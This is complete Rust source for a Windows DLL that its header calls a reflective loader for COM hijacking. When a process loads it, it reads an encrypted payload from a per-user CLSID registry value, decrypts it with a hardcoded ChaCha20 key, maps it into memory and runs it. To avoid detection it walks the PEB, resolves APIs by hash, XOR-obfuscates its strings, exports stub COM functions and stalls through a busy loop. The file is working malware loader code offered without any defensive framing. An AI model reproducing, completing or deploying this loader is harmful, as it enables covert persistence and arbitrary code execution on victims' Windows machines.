#![no_std]
#![no_main]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

//! # Reflective Loader DLL (COM Hijacking) - NO_STD VERSION
//!
//! Zero Rust runtime - pure Windows API via PEB walking.
//! No CreateToolhelp32Snapshot, no Module32*, minimal imports.
//!
//! Key changes from std version:
//! - core::* instead of std::*
//! - Static buffers instead of Vec/String
//! - Manual memory management via VirtualAlloc
//! - No format! macro - manual string building

use core::ffi::c_void;
use core::mem;
use core::ptr;
use core::slice;

// Panic handler required for no_std
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

// ============================================================================
// CHACHA20 (Inline, no deps)
// ============================================================================

struct ChaCha20 {
    state: [u32; 16],
    keystream: [u8; 64],
    pos: usize,
}

impl ChaCha20 {
    fn new(key: &[u8; 32], nonce: &[u8; 12]) -> Self {
        let mut state = [0u32; 16];
        // Obfuscated Constants (XOR 0x55555555)
        state[0] = 0x34252d30 ^ 0x55555555;
        state[1] = 0x6675313b ^ 0x55555555;
        state[2] = 0x2c377867 ^ 0x55555555;
        state[3] = 0x3e753021 ^ 0x55555555;
        
        for i in 0..8 {
            state[4 + i] = u32::from_le_bytes([key[i*4], key[i*4+1], key[i*4+2], key[i*4+3]]);
        }
        
        state[12] = 0;
        for i in 0..3 {
            state[13 + i] = u32::from_le_bytes([nonce[i*4], nonce[i*4+1], nonce[i*4+2], nonce[i*4+3]]);
        }
        
        Self { state, keystream: [0; 64], pos: 64 }
    }
    
    fn apply_keystream(&mut self, data: &mut [u8]) {
        for byte in data.iter_mut() {
            if self.pos >= 64 {
                self.generate_block();
                self.pos = 0;
            }
            *byte ^= self.keystream[self.pos];
            self.pos += 1;
        }
    }
    
    fn generate_block(&mut self) {
        let mut x = self.state;
        
        for _ in 0..10 {
            Self::qr(&mut x, 0, 4, 8, 12);
            Self::qr(&mut x, 1, 5, 9, 13);
            Self::qr(&mut x, 2, 6, 10, 14);
            Self::qr(&mut x, 3, 7, 11, 15);
            Self::qr(&mut x, 0, 5, 10, 15);
            Self::qr(&mut x, 1, 6, 11, 12);
            Self::qr(&mut x, 2, 7, 8, 13);
            Self::qr(&mut x, 3, 4, 9, 14);
        }
        
        for i in 0..16 {
            x[i] = x[i].wrapping_add(self.state[i]);
            let bytes = x[i].to_le_bytes();
            self.keystream[i*4..(i+1)*4].copy_from_slice(&bytes);
        }
        
        self.state[12] = self.state[12].wrapping_add(1);
    }
    
    #[inline(always)]
    fn qr(x: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
        x[a] = x[a].wrapping_add(x[b]); x[d] ^= x[a]; x[d] = x[d].rotate_left(16);
        x[c] = x[c].wrapping_add(x[d]); x[b] ^= x[c]; x[b] = x[b].rotate_left(12);
        x[a] = x[a].wrapping_add(x[b]); x[d] ^= x[a]; x[d] = x[d].rotate_left(8);
        x[c] = x[c].wrapping_add(x[d]); x[b] ^= x[c]; x[b] = x[b].rotate_left(7);
    }
}

// ============================================================================
// DJB2 HASH
// ============================================================================

pub const fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ (s[i] as u32);
        i += 1;
    }
    hash
}

fn djb2_wide(s: *const u16, len: usize) -> u32 {
    let mut hash: u32 = 5381;
    for i in 0..len {
        let c = unsafe { *s.add(i) } as u32;
        let c_lower = if c >= 65 && c <= 90 { c + 32 } else { c };
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ c_lower;
    }
    hash
}

// ============================================================================
// API HASHES
// ============================================================================

const HASH_KERNEL32: u32 = 0x3E003875;
const HASH_ADVAPI32: u32 = 0x03C6B585;

const HASH_VIRTUAL_ALLOC: u32 = 0x19FBBF49;
const HASH_VIRTUAL_PROTECT: u32 = 0x17EA484F;
const HASH_VIRTUAL_FREE: u32 = 0x668FCF2E;
const HASH_LOAD_LIBRARY_A: u32 = 0x01ED9ADD;
const HASH_GET_PROC_ADDRESS: u32 = 0xAADFAB0B;
const HASH_REG_OPEN_KEY_EX_W: u32 = 0x9139725C;
const HASH_REG_QUERY_VALUE_EX_W: u32 = 0x6383195E;
const HASH_REG_CLOSE_KEY: u32 = 0x66579AD4;

// ============================================================================
// CONSTANTS
// ============================================================================

// ChaCha20 Key: "PryzrakMeshKey2026_SecretKey!@#$" XOR 0x55
const CHACHA_KEY_ENC: [u8; 32] = [
    0x05, 0x3D, 0x34, 0x3B, 0x21, 0x3A, 0x38, 0x18,
    0x30, 0x26, 0x3D, 0x1E, 0x30, 0x2C, 0x67, 0x65,
    0x67, 0x63, 0x0A, 0x06, 0x30, 0x36, 0x27, 0x30,
    0x21, 0x1E, 0x30, 0x2C, 0x74, 0x15, 0x76, 0x71,
];

// Nonce: "PHMNONCE0001" XOR 0x55
const CHACHA_NONCE_ENC: [u8; 12] = [0x05, 0x1D, 0x18, 0x1B, 0x1A, 0x1B, 0x16, 0x10, 0x65, 0x65, 0x65, 0x64];
const KEY_XOR: u8 = 0x55;

const HKEY_CURRENT_USER: isize = 0x80000001u32 as isize;
const KEY_READ: u32 = 0x20019;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_READWRITE: u32 = 0x04;

const DLL_PROCESS_ATTACH: u32 = 1;

// ============================================================================
// API TYPES
// ============================================================================

type FnVa = unsafe extern "system" fn(*const c_void, usize, u32, u32) -> *mut c_void;
type FnVp = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
type FnVf = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
type FnLl = unsafe extern "system" fn(*const u8) -> isize;
type FnGp = unsafe extern "system" fn(isize, *const u8) -> Option<unsafe extern "system" fn()>;
type FnRo = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
type FnRq = unsafe extern "system" fn(isize, *const u16, *const u32, *mut u32, *mut u8, *mut u32) -> i32;
type FnRc = unsafe extern "system" fn(isize) -> i32;

// ============================================================================
// PE STRUCTURES
// ============================================================================

#[repr(C)]
struct IMAGE_DOS_HEADER { e_magic: u16, _pad: [u8; 58], e_lfanew: i32 }

#[repr(C)]
struct IMAGE_NT_HEADERS64 { Signature: u32, FileHeader: IMAGE_FILE_HEADER, OptionalHeader: IMAGE_OPTIONAL_HEADER64 }

#[repr(C)]
struct IMAGE_FILE_HEADER { Machine: u16, NumberOfSections: u16, TimeDateStamp: u32, PointerToSymbolTable: u32, NumberOfSymbols: u32, SizeOfOptionalHeader: u16, Characteristics: u16 }

#[repr(C)]
struct IMAGE_OPTIONAL_HEADER64 {
    Magic: u16, MajorLinkerVersion: u8, MinorLinkerVersion: u8,
    SizeOfCode: u32, SizeOfInitializedData: u32, SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32, BaseOfCode: u32, ImageBase: u64,
    SectionAlignment: u32, FileAlignment: u32,
    MajorOSVersion: u16, MinorOSVersion: u16, MajorImageVersion: u16, MinorImageVersion: u16,
    MajorSubsystemVersion: u16, MinorSubsystemVersion: u16, Win32VersionValue: u32,
    SizeOfImage: u32, SizeOfHeaders: u32, CheckSum: u32, Subsystem: u16, DllCharacteristics: u16,
    SizeOfStackReserve: u64, SizeOfStackCommit: u64, SizeOfHeapReserve: u64, SizeOfHeapCommit: u64,
    LoaderFlags: u32, NumberOfRvaAndSizes: u32, DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct IMAGE_DATA_DIRECTORY { VirtualAddress: u32, Size: u32 }

#[repr(C)]
struct IMAGE_SECTION_HEADER { Name: [u8; 8], VirtualSize: u32, VirtualAddress: u32, SizeOfRawData: u32, PointerToRawData: u32, _pad: [u32; 3], Characteristics: u32 }

#[repr(C)]
struct IMAGE_BASE_RELOCATION { VirtualAddress: u32, SizeOfBlock: u32 }

#[repr(C)]
struct IMAGE_IMPORT_DESCRIPTOR { OriginalFirstThunk: u32, TimeDateStamp: u32, ForwarderChain: u32, Name: u32, FirstThunk: u32 }

// ============================================================================
// PEB WALKING (x86_64)
// ============================================================================

#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn get_module_by_hash(target_hash: u32) -> Option<*const c_void> {
    let peb: *const u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    
    let ldr = *(peb.add(0x18) as *const *const u8);
    let list_head = ldr.add(0x20);
    let mut entry = *(list_head as *const *const u8);
    let head = entry;
    
    while !entry.is_null() {
        let base = *((entry as usize + 0x20) as *const *const c_void);
        let name_ptr = *((entry as usize + 0x50) as *const *const u16);
        let name_len = *((entry as usize + 0x48) as *const u16) as usize / 2;
        
        if !name_ptr.is_null() && name_len > 0 {
            let hash = djb2_wide(name_ptr, name_len);
            if hash == target_hash { return Some(base); }
        }
        
        entry = *(entry as *const *const u8);
        if entry == head { break; }
    }
    None
}

unsafe fn get_export_by_hash(module: *const c_void, func_hash: u32) -> Option<*const c_void> {
    if module.is_null() { return None; }
    
    let dos = module as *const u8;
    if *(dos as *const u16) != 0x5A4D { return None; }
    
    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    let export_rva = *((nt as usize + 0x88) as *const u32);
    if export_rva == 0 { return None; }
    
    #[repr(C)]
    struct ExportDir { _pad: [u32; 6], num_funcs: u32, num_names: u32, addr_funcs: u32, addr_names: u32, addr_ordinals: u32 }
    
    let export = dos.add(export_rva as usize) as *const ExportDir;
    let names = dos.add((*export).addr_names as usize) as *const u32;
    let funcs = dos.add((*export).addr_funcs as usize) as *const u32;
    let ordinals = dos.add((*export).addr_ordinals as usize) as *const u16;
    
    for i in 0..(*export).num_names as usize {
        let name_rva = *names.add(i);
        let name_ptr = dos.add(name_rva as usize);
        
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        let hash = djb2(slice::from_raw_parts(name_ptr, len));
        
        if hash == func_hash {
            let ordinal = *ordinals.add(i) as usize;
            let func_rva = *funcs.add(ordinal);
            return Some(dos.add(func_rva as usize) as *const c_void);
        }
    }
    None
}

unsafe fn resolve_api<T>(module_hash: u32, func_hash: u32) -> Option<T> {
    let module = get_module_by_hash(module_hash)?;
    let func = get_export_by_hash(module, func_hash)?;
    Some(mem::transmute_copy(&func))
}

// ============================================================================
// DLL ENTRY POINT
// ============================================================================

#[no_mangle]
pub extern "system" fn DllMain(
    _h_module: *mut c_void,
    ul_reason: u32,
    _reserved: *mut c_void
) -> i32 {
    if ul_reason == DLL_PROCESS_ATTACH {
        unsafe { run_loader_inline(); }
    }
    1
}

/// Run loader directly (no thread spawn to avoid CreateThread import)
unsafe fn run_loader_inline() {
    // Small delay using a busy loop (no Sleep import needed)
    // ~2 seconds at typical CPU speed
    for _ in 0..50_000_000u64 {
        core::hint::spin_loop();
    }
    
    let _ = run_loader();
}

unsafe fn run_loader() -> Result<(), ()> {
    let (payload_ptr, payload_len) = read_registry_payload()?;
    decrypt_payload_inplace(payload_ptr, payload_len);
    let entry = reflective_load(payload_ptr, payload_len)?;
    
    // Free payload buffer
    let fn_vf: FnVf = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_FREE).ok_or(())?;
    fn_vf(payload_ptr as *mut c_void, 0, MEM_RELEASE);
    
    // Execute
    let entry_fn: extern "system" fn() -> i32 = mem::transmute(entry);
    entry_fn();
    Ok(())
}

// ============================================================================
// COM EXPORTS
// ============================================================================

#[no_mangle]
pub extern "system" fn DllGetClassObject(
    _rclsid: *const c_void,
    _riid: *const c_void,
    _ppv: *mut *mut c_void
) -> i32 {
    0x80004002u32 as i32 // E_NOINTERFACE
}

#[no_mangle]
pub extern "system" fn DllCanUnloadNow() -> i32 {
    1 // S_FALSE
}

#[no_mangle]
pub extern "system" fn DllRegisterServer() -> i32 {
    0
}

#[no_mangle]
pub extern "system" fn DllUnregisterServer() -> i32 {
    0
}

// ============================================================================
// REGISTRY READ (Returns allocated buffer)
// ============================================================================

unsafe fn read_registry_payload() -> Result<(*mut u8, usize), ()> {
    // Load advapi32
    let load_lib: FnLl = resolve_api(HASH_KERNEL32, HASH_LOAD_LIBRARY_A).ok_or(())?;
    
    // "advapi32.dll\0" XOR 0x55
    let dll_enc: [u8; 13] = [0x34, 0x31, 0x23, 0x34, 0x27, 0x3C, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
    let mut dll_dec: [u8; 13] = [0; 13];
    for i in 0..13 { dll_dec[i] = dll_enc[i] ^ 0x55; }
    load_lib(dll_dec.as_ptr());
    
    let advapi32 = get_module_by_hash(HASH_ADVAPI32).ok_or(())?;
    let fn_ro: FnRo = mem::transmute(get_export_by_hash(advapi32, HASH_REG_OPEN_KEY_EX_W).ok_or(())?);
    let fn_rq: FnRq = mem::transmute(get_export_by_hash(advapi32, HASH_REG_QUERY_VALUE_EX_W).ok_or(())?);
    let fn_rc: FnRc = mem::transmute(get_export_by_hash(advapi32, HASH_REG_CLOSE_KEY).ok_or(())?);
    let fn_va: FnVa = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_ALLOC).ok_or(())?;
    
    // Build registry path as static wide string
    // "Software\Classes\CLSID\{e403d151-54b0-466d-8958-69225785f78a}"
    // "Software\Classes\CLSID\{e403d151-54b0-466d-8958-69225785f78a}\0"
    static REG_PATH: [u16; 62] = [
        0x53, 0x6F, 0x66, 0x74, 0x77, 0x61, 0x72, 0x65, 0x5C, // Software\
        0x43, 0x6C, 0x61, 0x73, 0x73, 0x65, 0x73, 0x5C,       // Classes\
        0x43, 0x4C, 0x53, 0x49, 0x44, 0x5C,                   // CLSID\
        0x7B, 0x65, 0x34, 0x30, 0x33, 0x64, 0x31, 0x35, 0x31, // {e403d151
        0x2D, 0x35, 0x34, 0x62, 0x30, 0x2D,                   // -54b0-
        0x34, 0x36, 0x36, 0x64, 0x2D,                         // 466d-
        0x38, 0x39, 0x35, 0x38, 0x2D,                         // 8958-
        0x36, 0x39, 0x32, 0x32, 0x35, 0x37, 0x38, 0x35, 0x66, 0x37, 0x38, 0x61, // 69225785f78a
        0x7D, 0x00                                             // }\0
    ];
    
    // "Payload" as wide string
    static VAL_NAME: [u16; 8] = [0x50, 0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64, 0x00]; // Payload\0
    
    // Open key
    let mut hkey: isize = 0;
    if fn_ro(HKEY_CURRENT_USER, REG_PATH.as_ptr(), 0, KEY_READ, &mut hkey) != 0 { 
        return Err(()); 
    }
    
    // Query size
    let mut size: u32 = 0;
    let mut dtype: u32 = 0;
    fn_rq(hkey, VAL_NAME.as_ptr(), ptr::null(), &mut dtype, ptr::null_mut(), &mut size);
    
    if size == 0 {
        fn_rc(hkey);
        return Err(());
    }
    
    // Allocate buffer
    let buffer = fn_va(ptr::null(), size as usize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as *mut u8;
    if buffer.is_null() {
        fn_rc(hkey);
        return Err(());
    }
    
    // Read value
    if fn_rq(hkey, VAL_NAME.as_ptr(), ptr::null(), &mut dtype, buffer, &mut size) != 0 {
        fn_rc(hkey);
        return Err(());
    }
    fn_rc(hkey);
    
    // Convert wide string to bytes and base64 decode
    let wide_len = size as usize / 2;
    let decoded = base64_decode_wide(buffer as *const u16, wide_len)?;
    
    // Free the registry buffer, return decoded buffer
    let fn_vf: FnVf = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_FREE).ok_or(())?;
    fn_vf(buffer as *mut c_void, 0, MEM_RELEASE);
    
    Ok(decoded)
}

/// Base64 decode from wide string, returns (ptr, len)
unsafe fn base64_decode_wide(input: *const u16, len: usize) -> Result<(*mut u8, usize), ()> {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    let fn_va: FnVa = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_ALLOC).ok_or(())?;
    
    // Estimate output size (input * 3/4)
    let out_size = (len * 3 / 4) + 16;
    let output = fn_va(ptr::null(), out_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as *mut u8;
    if output.is_null() { return Err(()); }
    
    let mut out_idx = 0usize;
    let mut buf: u32 = 0;
    let mut bits: u8 = 0;
    
    for i in 0..len {
        let c = *input.add(i) as u8;
        if c == 0 || c == b'=' { break; }
        
        // Find position in table
        let mut val = 255u8;
        for (j, &t) in TABLE.iter().enumerate() {
            if t == c { val = j as u8; break; }
        }
        if val == 255 { continue; } // Skip invalid chars
        
        buf = (buf << 6) | (val as u32);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            *output.add(out_idx) = (buf >> bits) as u8;
            out_idx += 1;
            buf &= (1 << bits) - 1;
        }
    }
    
    Ok((output, out_idx))
}

fn get_key() -> [u8; 32] {
    let mut k = CHACHA_KEY_ENC;
    for b in k.iter_mut() { *b ^= KEY_XOR; }
    k
}

fn get_nonce() -> [u8; 12] {
    let mut n = CHACHA_NONCE_ENC;
    for b in n.iter_mut() { *b ^= KEY_XOR; }
    n
}

unsafe fn decrypt_payload_inplace(data: *mut u8, len: usize) {
    let mut cipher = ChaCha20::new(&get_key(), &get_nonce());
    let slice = slice::from_raw_parts_mut(data, len);
    cipher.apply_keystream(slice);
}

// ============================================================================
// REFLECTIVE LOADER
// ============================================================================

unsafe fn reflective_load(pe_data: *const u8, _pe_len: usize) -> Result<*const c_void, ()> {
    let fn_va: FnVa = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_ALLOC).ok_or(())?;
    let fn_vp: FnVp = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_PROTECT).ok_or(())?;
    let fn_ll: FnLl = resolve_api(HASH_KERNEL32, HASH_LOAD_LIBRARY_A).ok_or(())?;
    let fn_gp: FnGp = resolve_api(HASH_KERNEL32, HASH_GET_PROC_ADDRESS).ok_or(())?;
    
    let dos = pe_data as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != 0x5A4D { return Err(()); }
    
    let nt = pe_data.add((*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != 0x00004550 { return Err(()); }
    
    let opt = &(*nt).OptionalHeader;
    let file_hdr = &(*nt).FileHeader;
    
    let image_base = fn_va(ptr::null(), opt.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if image_base.is_null() { return Err(()); }
    
    ptr::copy_nonoverlapping(pe_data, image_base as *mut u8, opt.SizeOfHeaders as usize);
    
    let sections_base = (nt as usize + 24 + file_hdr.SizeOfOptionalHeader as usize) as *const IMAGE_SECTION_HEADER;
    for i in 0..file_hdr.NumberOfSections as usize {
        let section = &*sections_base.add(i);
        if section.SizeOfRawData == 0 { continue; }
        let dest = (image_base as usize + section.VirtualAddress as usize) as *mut u8;
        let src = pe_data.add(section.PointerToRawData as usize);
        ptr::copy_nonoverlapping(src, dest, section.SizeOfRawData as usize);
    }
    
    let delta = image_base as i64 - opt.ImageBase as i64;
    if delta != 0 { process_relocations(image_base, opt, delta)?; }
    
    resolve_imports(image_base, opt, fn_ll, fn_gp)?;
    
    // Set section permissions
    let mut old_prot: u32 = 0;
    fn_vp(image_base, opt.SizeOfHeaders as usize, 0x02, &mut old_prot);
    
    for i in 0..file_hdr.NumberOfSections as usize {
        let section = &*sections_base.add(i);
        if section.SizeOfRawData == 0 && section.VirtualSize == 0 { continue; }
        
        let dest = (image_base as usize + section.VirtualAddress as usize) as *mut c_void;
        let size = section.VirtualSize as usize;
        
        let chars = section.Characteristics;
        let x = (chars & 0x20000000) != 0;
        let w = (chars & 0x80000000) != 0;
        let r = (chars & 0x40000000) != 0;
        
        let mut prot = 0x01;
        if x {
            prot = if w { 0x40 } else { 0x20 };
        } else if w {
            prot = 0x04;
        } else if r {
            prot = 0x02;
        }
        
        if size > 0 {
            fn_vp(dest, size, prot, &mut old_prot);
        }
    }
    
    Ok((image_base as usize + opt.AddressOfEntryPoint as usize) as *const c_void)
}

unsafe fn process_relocations(base: *mut c_void, opt: &IMAGE_OPTIONAL_HEADER64, delta: i64) -> Result<(), ()> {
    let reloc_dir = &opt.DataDirectory[5];
    if reloc_dir.VirtualAddress == 0 { return Ok(()); }
    
    let mut reloc = (base as usize + reloc_dir.VirtualAddress as usize) as *const IMAGE_BASE_RELOCATION;
    let reloc_end = (base as usize + reloc_dir.VirtualAddress as usize + reloc_dir.Size as usize) as *const u8;
    
    while (reloc as *const u8) < reloc_end && (*reloc).SizeOfBlock > 0 {
        let block_base = base as usize + (*reloc).VirtualAddress as usize;
        let entry_count = ((*reloc).SizeOfBlock as usize - 8) / 2;
        let entries = (reloc as usize + 8) as *const u16;
        
        for i in 0..entry_count {
            let entry = *entries.add(i);
            if (entry >> 12) == 10 {
                let addr = (block_base + (entry & 0xFFF) as usize) as *mut i64;
                *addr += delta;
            }
        }
        reloc = (reloc as usize + (*reloc).SizeOfBlock as usize) as *const IMAGE_BASE_RELOCATION;
    }
    Ok(())
}

unsafe fn resolve_imports(base: *mut c_void, opt: &IMAGE_OPTIONAL_HEADER64, fn_ll: FnLl, fn_gp: FnGp) -> Result<(), ()> {
    let import_dir = &opt.DataDirectory[1];
    if import_dir.VirtualAddress == 0 { return Ok(()); }
    
    let mut import = (base as usize + import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;
    
    while (*import).Name != 0 {
        let dll_name = (base as usize + (*import).Name as usize) as *const u8;
        let dll = fn_ll(dll_name);
        if dll == 0 { return Err(()); }
        
        let mut thunk = (base as usize + (*import).FirstThunk as usize) as *mut usize;
        let orig = if (*import).OriginalFirstThunk != 0 { 
            (base as usize + (*import).OriginalFirstThunk as usize) as *const usize 
        } else { 
            thunk as *const usize 
        };
        let mut orig_thunk = orig;
        
        while *orig_thunk != 0 {
            let addr = if (*orig_thunk & (1usize << 63)) != 0 {
                fn_gp(dll, (*orig_thunk & 0xFFFF) as *const u8)
            } else {
                fn_gp(dll, (base as usize + *orig_thunk as usize + 2) as *const u8)
            };
            if addr.is_none() { return Err(()); }
            *thunk = addr.unwrap() as usize;
            thunk = thunk.add(1);
            orig_thunk = orig_thunk.add(1);
        }
        import = import.add(1);
    }
    Ok(())
}
